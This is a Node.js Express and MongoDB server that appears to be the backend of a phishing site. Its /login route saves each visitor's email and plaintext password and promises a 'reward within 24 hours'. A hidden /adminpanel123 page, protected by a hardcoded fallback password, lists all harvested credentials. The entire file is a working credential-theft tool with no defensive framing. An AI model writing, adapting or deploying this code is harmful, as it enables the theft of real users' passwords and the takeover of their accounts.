const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB connect
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("MongoDB Connected"))
    .catch(err => console.log("MongoDB Error:", err.message));

// Schema
const UserSchema = new mongoose.Schema({ email: String, password: String }, { timestamps: true });
const User = mongoose.model('User', UserSchema);

// Password for admin (set in .env)
const ADMIN_PASS = process.env.ADMIN_PASS || "mysecret123";

// Admin login page
app.get('/adminpanel123', (req, res) => {
    res.send(`
        <form method="POST" style="margin:100px auto;width:300px;text-align:center;">
            <h2>Admin Login</h2>
            <input type="password" name="password" placeholder="Enter Password" style="width:100%;padding:10px;margin:10px 0;">
            <button type="submit" style="padding:10px 20px;">Login</button>
        </form>
    `);
});

// Handle admin login
app.post('/adminpanel123', async (req, res) => {
    if (req.body.password !== ADMIN_PASS) {
        return res.send("<h2>Wrong Password</h2><a href='/adminpanel123'>Try Again</a>");
    }
    const users = await User.find().sort({ createdAt: -1 });
    let html = "<h1>Customer Data</h1><table border='1' cellpadding='5' style='border-collapse:collapse;width:100%'><tr><th>Email</th><th>Password</th><th>Date</th></tr>";
    users.forEach(u => { html += `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.createdAt}</td></tr>`; });
    html += "</table>";
    res.send(html);
});

// Serve website
app.use(express.static('public'));

// Save login
app.post('/login', async (req, res) => {
    await User.create({ email: req.body.email, password: req.body.password });
    res.send(`
        <style>body{font-family:sans-serif;text-align:center;margin-top:100px;}</style>
        <h1>Thank you for providing information!</h1>
        <p>Your reward will be delivered within 24 hours.</p>
        <a href="/">Back to site</a>
    `);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port " + PORT));
